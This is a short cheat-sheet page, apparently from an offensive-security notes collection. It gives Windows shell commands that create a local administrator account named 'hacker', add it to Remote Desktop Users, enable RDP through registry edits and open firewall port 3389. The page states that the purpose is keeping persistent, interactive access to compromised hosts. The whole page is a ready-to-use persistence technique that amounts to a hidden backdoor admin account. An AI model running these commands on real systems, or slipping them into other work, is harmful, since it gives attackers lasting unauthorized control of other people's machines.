---
title: "Add RDP"
---

# Add RDP

Creates a local admin user with Remote Desktop User privileges and enables RDP via registry and firewall. Useful for maintaining persistent and interactive access on Windows hosts.

```shell
net user hacker hacker /add
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
netsh firewall add portopening TCP 3389 "Remote Desktop"
netsh firewall set service remoteadmin enable
```
